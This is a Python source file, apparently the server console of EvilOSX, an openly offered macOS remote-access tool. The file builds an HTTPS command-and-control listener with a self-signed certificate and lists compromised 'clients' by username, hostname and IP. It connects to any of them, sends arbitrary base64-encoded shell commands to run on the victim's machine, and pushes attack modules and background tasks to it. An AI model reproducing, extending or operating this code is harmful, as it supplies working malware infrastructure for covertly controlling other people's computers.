#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""Interacts with the user via urwid."""
from __future__ import print_function
from __future__ import absolute_import
__author__ = "Marten4n6"
__license__ = "GPLv3"
__version__ = "1.1.3"

from .model import *
from .modules import *
from .controller import *
import urwid
import threading
import ssl
import os
import time
import base64
from textwrap import dedent
from sys import exit
from Queue import Queue

BANNER = """\
  ______       _  _   ____    _____ __   __
 |  ____|     (_)| | / __ \  / ____|\ \ / /
 | |__ __   __ _ | || |  | || (___   \ V / 
 |  __|\ \ / /| || || |  | | \___ \   > <  
 | |____\ V / | || || |__| | ____) | / . \ 
 |______|\_/  |_||_| \____/ |_____/ /_/ \_\\ @%s
""" % __author__

MESSAGE_INPUT = "\033[1m" + "[?] " + "\033[0m"
MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"

DRAW_LOCK = threading.RLock()


class SafeMainLoop(urwid.MainLoop):
    """Subclass which makes sure only one thread can draw the screen at a time"""

    def __init__(self, widget, palette=(), screen=None, handle_mouse=True, input_filter=None,
                 unhandled_input=None, event_loop=None, pop_ups=False):
        super(SafeMainLoop, self).__init__(
            widget, palette, screen, handle_mouse,
            input_filter, unhandled_input, event_loop, pop_ups
        )

    def draw_screen(self):
        with DRAW_LOCK:
            super(SafeMainLoop, self).draw_screen()


class _ModulePrompt(urwid.Pile):
    """Simple class which modules can use to interact with the user."""

    def __init__(self, module_name, main_loop):
        self.module_name = module_name
        self._main_loop = main_loop

        self._output_list = urwid.ListBox(urwid.SimpleFocusListWalker([]))
        self._output_layout = urwid.BoxAdapter(self._output_list, 0)  # Dynamically change size
        self._edit_box = urwid.Edit()

        self._queue = None
        self._lock = threading.Lock()

        self.previous_prompt = False

        urwid.Pile.__init__(self, [
            urwid.AttrWrap(urwid.Text("Module %s: " % module_name), "reversed"),
            self._output_layout,
            self._edit_box
        ])

        self.focus_item = self._edit_box

    def add(self, line, style=""):
        """Adds a line to the output list."""
        with self._lock:
            # Set the height of the output list so the message is actually visible.
            self._output_layout.height = len(self._output_list.body) + 1

            if style == "info":
                self._output_list.body.append(urwid.Text([("normal", "["), ("info", "I"), ("normal", "] " + line)]))
            elif style == "input":
                self._output_list.body.append(urwid.Text("[?] " + line))
            elif style == "attention":
                self._output_list.body.append(
                    urwid.Text([("normal", "["), ("attention", "!"), ("normal", "] " + line)]))
            else:
                self._output_list.body.append(urwid.Text(line))

            self._main_loop.draw_screen()  # Important!

    def cleanup(self):
        """Cleans up the output list."""
        with self._lock:
            self._output_list.body = urwid.SimpleFocusListWalker([])
            self._output_layout.height = 0

    def prompt(self, message):
        """Blocking method, prompts the user and returns the response.

        :param message The prompt message to display to the user.
        :type message str
        """
        if self.previous_prompt:
            # Clear the previous prompt.
            self.cleanup()
        else:
            self.previous_prompt = True

        self.add(message, "input")
        self._queue = Queue()

        # Blocks until input from keypress, which is
        # possible since we start the module view in it's own thread.
        return self._queue.get()

    def keypress(self, size, key):
        """Keypress events."""
        if key == "enter":
            command = self._edit_box.edit_text

            # Unblocks the prompt method.
            self._queue.put(command)
            self._edit_box.edit_text = ""
        else:
            urwid.Edit.keypress(self._edit_box, size, key)


class _InputView(urwid.Pile):
    """This class shows the default command input view."""
    signals = ["line_entered"]

    def __init__(self):
        self._header_text = urwid.Text("Command: ")
        self._edit_box = urwid.Edit()

        urwid.Pile.__init__(self, [
            urwid.AttrWrap(self._header_text, "reversed"),
            self._edit_box
        ])

        self.focus_item = self._edit_box

    def set_connected_client(self, client=None):
        """Sets the connected client text.

        :type client Client
        """
        if not client:
            self._header_text.set_text("Command: ")
        else:
            self._header_text.set_text("Command (%s@%s): " % (client.username, client.hostname))

    def keypress(self, size, key):
        """Keypress events."""
        if key == "enter":
            command = self._edit_box.edit_text.strip()

            if command:
                # Call listeners.
                urwid.emit_signal(self, "line_entered", command)
            self._edit_box.edit_text = ""
        else:
            urwid.Edit.keypress(self._edit_box, size, key)


class _OutputView(urwid.ListBox):
    """This class shows all command output (thread safe)."""

    def __init__(self, view, max_size=1337):
        urwid.ListBox.__init__(self, urwid.SimpleListWalker([]))

        self.SEPARATOR = "-" * 5

        self._view = view
        self._max_size = max_size
        self._lock = threading.Lock()

    def add(self, line, style=""):
        """Adds a line to the output view.

        :param style The prefix to give the line (info, input or attention).
        :type line str
        :type style str
        """
        with self._lock:
            was_on_end = self.get_focus()[1] == len(self.body) - 1

            if len(self.body) > self._max_size:
                # Size limit reached, delete the first line.
                del self.body[0]

            if style == "info":
                self.body.append(urwid.Text([('normal', "["), ('info', "I"), ("normal", "] " + line)]))
            elif style == "input":
                self.body.append(urwid.Text([('normal', "["), ('reversed', "?"), ("normal", "] " + line)]))
            elif style == "attention":
                self.body.append(urwid.Text([('normal', "["), ('attention', "!"), ("normal", "] " + line)]))
            else:
                self.body.append(urwid.Text(line))

            if was_on_end:
                self.set_focus(len(self.body) - 1, "above")

            self._view.async_reload()

    def clear(self):
        """Clears the output view."""
        with self._lock:
            del self.body[:]
            self._view.async_reload()


class View(urwid.Frame):
    """This class interacts with the user."""

    def __init__(self, model, modules, server_port):
        self._model = model
        self._modules = modules

        self._PALETTE = [
            ("reversed", urwid.BLACK, urwid.LIGHT_GRAY),
            ("normal", urwid.LIGHT_GRAY, urwid.BLACK),
            ("info", urwid.LIGHT_BLUE, urwid.BLACK),
            ("attention", urwid.LIGHT_RED, urwid.BLACK)
        ]

        self.output_view = _OutputView(self)
        self._input_view = _InputView()

        self._current_client = None
        self._main_loop = None
        self._main_loop_thread = None

        # Startup message
        self.output_view.add("Server started, waiting for connections...", "info")
        self.output_view.add("Type \"help\" to get a list of available commands.", "info")

        # Initialize the frame.
        urwid.Frame.__init__(self,
                             header=urwid.AttrWrap(urwid.Text("EvilOSX v%s | Port: %s" % (__version__, server_port)),
                                                   "reversed"),
                             body=self.output_view,
                             footer=self._input_view)

        # Register listeners.
        urwid.connect_signal(self._input_view, "line_entered", self.process_command)

        self.set_focus_path(["footer", 1])

    def async_reload(self):
        """Reloads the screen.

        If the screen is updated asynchronously from other threads we need to refresh the screen.
        """
        if self._main_loop and self._main_loop_thread != threading.current_thread():
            self._main_loop.draw_screen()

    def process_command(self, command):
        """Processes command input."""
        self.output_view.add(self.output_view.SEPARATOR)

        if command == "help":
            self.output_view.add("help             -   Show this help menu.")
            self.output_view.add("clients          -   Show a list of clients.")
            self.output_view.add("connect <ID>     -   Connect to the client.")
            self.output_view.add("modules          -   Show a list of available modules.")
            self.output_view.add("use <module>     -   Run the module on the client.")
            self.output_view.add("kill <task_name> -   Kills the running task (background module).")
            if not self._current_client:
                self.output_view.add("exit             -   Close the server and exit.")
            else:
                self.output_view.add("exit             -   Stop interacting with client.")
            self.output_view.add("Any other command will be run on the client.")
        elif command == "clients":
            clients = self._model.get_clients()

            if not clients:
                self.output_view.add("No available clients.", "attention")
            else:
                self.output_view.add(str(len(clients)) + " client(s) available:", "info")

                for i, client in enumerate(clients):
                    self.output_view.add("    %s = %s@%s (%s)" % (
                        str(i), client.username, client.hostname, client.remote_ip
                    ))
        elif command.startswith("connect"):
            try:
                specified_id = int(command.split(" ")[1])
                self._current_client = self._model.get_clients()[specified_id]

                self.output_view.add("Connected to \"%s@%s\", ready to send commands." % (
                    self._current_client.username, self._current_client.hostname
                ), "info")
                self._input_view.set_connected_client(self._current_client)
            except (IndexError, ValueError):
                self.output_view.add("Invalid client ID (see \"clients\").", "attention")
                self.output_view.add("Usage: connect <ID>", "attention")
        elif command == "modules":
            modules = self._modules.get_modules()

            if not modules:
                self.output_view.add(
                    "Failed to find modules, please restart and make sure you are running "
                    "the start command in the correct directory (in EvilOSX/).",
                    "attention"
                )
                self.output_view.add("Server start command: python server/server.py", "attention")
            else:
                for module_name, module_imp in modules.iteritems():
                    if module_name == "helpers":
                        continue

                    self.output_view.add("{0: <18} -   {1}".format(module_name, module_imp.info["Description"]))
        elif command == "clear":
            self.output_view.clear()
        elif command in ["q", "quit", "exit"] and not self._current_client:
            self._model.close()
            self._main_loop.stop()
            raise urwid.ExitMainLoop()
        else:
            # Commands that require an active connection.
            if not self._current_client:
                self.output_view.add("Not connected to a client (see \"connect\").", "attention")
            else:
                if (time.time() - float(self._current_client.last_online)) >= 60:
                    self.output_view.add("The client is idle and will take longer to respond.", "attention")

                if command in ["q", "quit", "exit"]:
                    self.output_view.add("Disconnected from \"%s@%s\"." % (
                        self._current_client.username, self._current_client.hostname
                    ), "info")

                    self._current_client = None
                    self._input_view.set_connected_client()
                elif command.startswith("use"):
                    # Execute a module
                    module_name = command.replace("use ", "").strip()

                    if module_name == "use":
                        self.output_view.add("Invalid module name (see \"modules\").", "attention")
                        self.output_view.add("Usage: use <module>", "attention")
                    else:
                        try:
                            module_imp = self._modules.get_module(module_name)
                            module_view = _ModulePrompt(module_name, self._main_loop)
                            successful = Queue()  # Stores the return value of the module_imp setup.

                            self.footer = module_view

                            # Starts the module view in it's own thread, needed since
                            # otherwise calls to prompt will block the whole GUI.
                            module_thread = threading.Thread(target=module_imp.setup,
                                                             args=(module_view, self.output_view, successful))
                            module_thread.daemon = True
                            module_thread.start()

                            # Start a thread which waits for the module to finish setup.
                            wait_thread = threading.Thread(target=self.module_wait,
                                                           args=(module_view, module_thread, successful, module_imp))
                            wait_thread.daemon = True
                            wait_thread.start()
                        except KeyError:
                            self.output_view.add("That module doesn't exist!", "attention")
                elif command.startswith("kill"):
                    # Kills a running task.
                    module_name = command.replace("kill ", "").strip()

                    if module_name == "kill":
                        self.output_view.add("Invalid task name (see \"modules\").", "attention")
                        self.output_view.add("Usage: kill <task_name>", "attention")
                    else:
                        self.output_view.add("Attempting to kill task \"%s\"..." % module_name, "info")

                        self._model.send_command(Command(
                            self._current_client.id, base64.b64encode("kill_task"), module_name
                        ))
                else:
                    self.output_view.add("Running command: " + command, "info")
                    self._model.send_command(Command(self._current_client.id, base64.b64encode(command)))

    def module_wait(self, module_view, module_thread, successful, module_imp):
        """Waits for the module setup to finish then sends the module to the client."""
        module_thread.join()  # Wait until the thread finishes.
        module_view.cleanup()

        # Switch back to the command input view.
        self.footer = self._input_view

        if successful.get():
            # The module setup was successful.
            module_code = base64.b64encode(dedent(module_imp.run()))
            is_task = module_imp.info["Task"]

            self.output_view.add("Running module \"%s\"..." % module_view.module_name, "info")

            if is_task:
                self.output_view.add("This module is a background task, use \"kill %s\" to stop it." %
                                     module_view.module_name, "info")

            self._model.send_command(Command(
                self._current_client.id, module_code, module_view.module_name, is_task
            ))

        self.async_reload()

    def run(self):
        """The main view program loop."""
        self._main_loop = SafeMainLoop(self, self._PALETTE, handle_mouse=True)
        self._main_loop.run()


def generate_ca():
    """Generates the self-signed certificate authority."""
    if not os.path.exists("server.cert"):
        print(MESSAGE_INFO + "Generating certificate authority (HTTPS)...")

        information = "/C=US/ST=New York/L=Brooklyn/O=EvilOSX/CN=EvilOSX"
        os.popen("openssl req -newkey rsa:4096 -nodes -x509 -days 365 -subj \"%s\" -sha256 "
                 "-keyout server.key -out server.cert" % information)


def main():
    print(BANNER)

    while True:
        try:
            server_port = int(raw_input(MESSAGE_INPUT + "Server port to listen on: "))
            break
        except ValueError:
            # For that one guy that doesn't know what a port is.
            continue

    generate_ca()

    model = ClientModel()
    modules = Modules()
    view = View(model, modules, server_port)

    # Via __init__ is a pain, trust me...
    ClientController._model = model
    ClientController._modules = modules
    ClientController._output_view = view.output_view

    # Start the multi-threaded HTTP server in it's own thread.
    server = ThreadedHTTPServer(('', server_port), ClientController)
    server.socket = ssl.wrap_socket(server.socket, keyfile="server.key", certfile="server.cert", server_side=True)

    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True  # Exit when the main method finishes.
    server_thread.start()

    # Start the view.
    view.run()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n" + MESSAGE_INFO + "Interrupted.")
        exit(0)
